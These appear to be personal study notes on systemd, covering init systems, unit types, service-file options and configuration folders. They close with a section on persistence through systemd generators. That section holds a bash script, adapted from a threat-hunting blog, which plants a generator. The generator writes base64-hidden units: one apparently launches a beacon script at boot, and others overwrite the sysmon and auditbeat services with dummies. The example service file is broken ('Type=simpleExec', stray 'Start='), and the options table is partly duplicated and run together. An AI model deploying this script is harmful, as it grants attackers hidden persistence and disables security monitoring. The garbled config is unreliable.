# Systemd Overview
![[systemd-overview.png]]
```text
a system and service manager for Linux operating systems. When run as first process on boot (as PID 1), it acts as init system that brings up and maintains user space services. Separate instances are started for logged-in users to start their services.
```
- Location: /lib/systemd/systemd
- On *my* debian 12 system
	- /usr/sbin/init -> /lib/systemd/systemd

## Init Systems
- Init systems are the first process started during boot
- Started by the kernel during the boot process

- Init systems are used to:
	- bootstrap user space
		- <u>bootstrapping</u>: the process of loading the basic software into the memory of a computer after power-on or general reset, the kernel will load the operating system which will then take care of loading other device drivers and software as needed.
		- self-tests, loading configuration settings, loading a BIOS, resident monitors, a hypervisor, an operating system, or utility software. 
		- "the system pulls itself up by its bootstraps"
	- manage user processes

- Critics
	- Dependencies that reduce compatibility
	- Potentially bloated
	- Complexity increases attack surface

- Systemd's 3 general functions
	- A system and service manager
	- A software platform (serves as a basis for developing other software)
	- The glue between applications and the kernel (provides various interfaces that expose functionalities provided by the kernel)

- Starts processes in parallel (faster than sequential startup)
	- systemd uses sockets and d-bus to talk between processes
## Units
- Systemd provides a dependency system between various entities called "units" of 11 types
- A unit refers to any resource that the system knows how to operate on and manage
	- standardized representation of system resources that can be managed by the suite of daemons and manipulated by the provided utilities.
- Units encapsulate objects that are relevant for system boot-up and maintenance

- Unit types
	- Service
		- Start and control daemons along with the processes they consist of
	- Socket
		- Encapsulate local IPC/network sockets
	- Target
		- Useful to group units, or provide synchronization points during boot
	- Device
		- Expose kernel devices in systemd and may be used to implement device-based activation
	- Mount
		- Control mount points in the file system
	- Automount
		- provide automount capabilities, for on-demand file system mounting and parallelized boot
	- Timer
		- Useful for triggering activation of other units
	- Swap
		- Encapsulates SWAP partitions or files of the OS
	- Path
		- May be used to activate other services when file system objects change or are modified
	- Slice
		- May be used to group units which manage system processes in a hierarchical tree for resource management purposes
	- Scope
		- Manage foreign processes instead of starting them as well

- Units are named as their configuration files

# Service Files

- Service files typically consist of 3 sections
- [Unit] and [Install] are common configuration sections
- [Service] configures service specific options

|Run Lvl|Target Units|Description|
|---|---|---|
|0|runlevel0.target, poweroff.target|Shut down and power off|
|1|runlevel1.target, rescue.target|Set up a rescue shell|
|2,3,4|runlevel[234].target, multi-user.target|Set up a non-gfx multi-user shell|
|5|runlevel5.target, graphical.target|Set up a gfx multi-user|
|6|runlevel6.target, reboot.target|Shut down and reboot the system|

## [Unit]

|Options|Description|
|---|---|
|Description|A short description of the unit.|
|Documentation|A list of URIs referencing documentation.|
|Before, After|The order in which units are started.|
|Requires|If this unit gets activated, the units listed here will be activated as well. If one of the other units gets deactivated or fails, this unit will be deactivated.|
|Wants|Configures weaker dependencies than Requires. If any of the listed units does not start successfully, it has no impact on the unit activation. This is the recommended way to establish custom unit dependencies.|
|Conflicts|If a unit has a Conflicts setting on another unit, starting the former will stop the latter and vice versa.|

## [Install]

|Option|Description|
|---|---|
|Alias|A space-separated list of additional names for the unit. Most systemctl commands, excluding systemctl enable, can use aliases instead of the actual unit name.|
|RequiredBy, WantedBy|The current service will be started when the listed services are started. See the description of Wants and Requires in the [Unit] section for details.|
|Also|Specifies a list of units to be enabled or disabled along with this unit when a user runs systemctl enable or systemctl disable.|

## [Service]

|Option|Description|
|---|---|
|Type|Configures the process start-up type. One of<br></br>simple (default) – starts the service immediately. It is expected that the main process of the service is defined in ExecStart.<br></br>forking – considers the service started up once the process forks and the parent has exited.<br></br>oneshot – similar to simple, but it is expected that the process has to exit before systemd starts follow-up units (useful for scripts that do a single job and then exit). You may want to set RemainAfterExit=yes as well so that systemd still considers the service as active after the process has exited.<br></br>dbus – similar to simple, but considers the service started up when the main process gains a D-Bus name.<br></br>notify – similar to simple, but considers the service started up only after it sends a special signal to systemd.<br></br>idle – similar to simple, but the actual execution of the service binary is delayed until all jobs are finished. |
| ExecStart | Commands with arguments to execute when the service is started. Type=oneshot enables specifying multiple custom commands that are then executed sequentially. ExecStartPre and ExecStartPost specify custom commands to be executed before and after ExecStart. | | ExecStop | Commands to execute to stop the service started via ExecStart. | | ExecReload | Commands to execute to trigger a configuration reload in the service. | | Restart | With this option enabled, the service shall be restarted when the service process exits, is killed, or a timeout is reached with the exception of a normal stop by the systemctl stop command. | | RemainAfterExit | If set to True, the service is considered active even when all its processes exited. Useful with Type=oneshot. Default value is False. |
|`ExecReload`|Commands to execute to trigger a configuration reload in the service.|
|`Restart`|With this option enabled, the service shall be restarted when the service process exits, is killed, or a timeout is reached with the exception of a normal stop by the `systemctl stop` command.|
|`RemainAfterExit`|If set to `True`, the service is considered active even when all its processes exited. Useful with `Type=oneshot`. Default value is `False`.|
# Startup Services
- Create a .service file using the fields outlined in the [Service] section in the `/etc/systemd/system/` directory
Example service file:
```markdown
[Unit]
Description=How-To Geek Service Example

Wants=network.target
After=syslog.target network-online.target

[Service]
Type=simpleExec
Start=/usr/local/bin/htg.sh
Restart=on-failure
RestartSec=10
KillMode=process

[Install]
WantedBy=multi-user.target
```
1. `sudo chmod 640 /etc/systemd/system/<service>.service`
2. `sudo systemctl daemon-reload`
3. `sudo systemctl enable <service>`
4. `sudo systemctl start <service>`
5. `sudo systemctl status <service>`
# Systemd Configuration Folder
- /etc/systemd/
    - system/
        - `basic.target.wants`
        - `getty.target.wants`
        - `bluetooth.target.wants`
        - `graphical.target.wants`
        - `dbus-fi.w1.wpa_supplicant1.service`
        - `multi-user.target.wants`
            - A special target unit for setting up a multi-user system (non-graphical). This is pulled in by graphical.target.
        - `dbus-org.bluez.service`
        - `network-online.target.wants`
        - `dbus-org.freedesktop.Avahi.service`
        - `dbus-org.freedesktop.ModemManager1.service`
        - `printer.target.wants`
        - `dbus-org.freedesktop.nm-dispatcher.service`
        - `sockets.target.wants`
        - `dbus-org.freedesktop.timesync1.service`
        - `sysinit.target.wants`
        - `display-manager.service`
        - `timers.target.wants`
    - network/
        - _My debian machine had nothing in here_
    - user/
        - `dbus-org.bluez.obex.service`
        - `gnome-session.target.wants`
        - `pipewire.service.wants`
        - `default.target.wants`
        - `graphical-session-pre.target.wants`
        - `sockets.target.wants`
    - `journald.conf`
    - `logind.conf`
    - `networkd.conf`
    - `pstore.conf`
    - `sleep.conf`
    - `system.conf`
    - `timesyncd.conf`
    - `user.conf`
# Persistence Methods
## Scheduled/Startup Tasks
- text
## Generators
- Generators are small executables placed in `/lib/systemd/system-generators/` and other directories. Systemd executes these binaries at bootup AND at configuration reload time  - before unit files are loaded
    - For details, see `man systemd.generator`
- Paths to generators (according to debian manpage)
    - `/run/systemd/system-generators/*`
    - `/etc/systemd/system-generators/*`
    - `/usr/local/lib/systemd/system-generators/*`
    - `/lib/systemd/system-generators/*`
    - `/run/systemd/user-generators/*`
    - `/etc/systemd/user-generators/*`
    - `/usr/local/lib/systemd/user-generators/*`
    - `/usr/lib/systemd/user-generators/*`
- Generators CANNOT
    - rely on any external services
    - talk to any other processes
        - logging or systemd itself
    - interact with file systems like `/var/` and `/home/` because they are mounted after generators run
- Generators CAN
    - rely on basic kernel functionality
    - interact with the mounted `/sys/`, `/proc/`, `/dev/`, `/usr/`, and `/run/` file systems
## Example Persistence with Generators
- [Example](https://pberba.github.io/security/2022/02/07/linux-threat-hunting-for-persistence-systemd-generators/)
```bash
cat > /usr/lib/systemd/system-generators/systemd-network-generator << EOF
#! /bin/bash

# Create networking.service and enabling it to run later in the boot process
echo 'W1VuaXRdCkRlc2NyaXB0aW9uPW5ldHdvcmtpbmcuc2VydmljZQoKW1NlcnZpY2VdCkV4ZWNTdGFydD0vb3B0L2JlYWNvbi5zaAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0' | base64 -d > /run/systemd/system/networking.service

mkdir -p /run/systemd/system/multi-user.target.wants/
ln -s /run/systemd/system/networking.service /run/systemd/system/multi-user.target.wants/networking.service

# Create adds dummy service unit files to overwrite sysmon.service and auditbeat.service
mkdir -p /run/systemd/generator.early
echo 'W1VuaXRdCkRlc2NyaXB0aW9uPSJTa2lwcGVkIgoKW1NlcnZpY2VdCkV4ZWNTdGFydD1lY2hvICJTa2lwcGVkIgoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0' | base64 -d > /run/systemd/generator.early/sysmon.service
echo 'W1VuaXRdCkRlc2NyaXB0aW9uPSJTa2lwcGVkIgoKW1NlcnZpY2VdCkV4ZWNTdGFydD1lY2hvICJTa2lwcGVkIgoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0' | base64 -d > /run/systemd/generator.early/auditbeat.service
EOF

chmod +x /lib/systemd/system-generators/systemd-network-generator
```
# Systemd Alternatives

## Systemv

## Xinit / init-d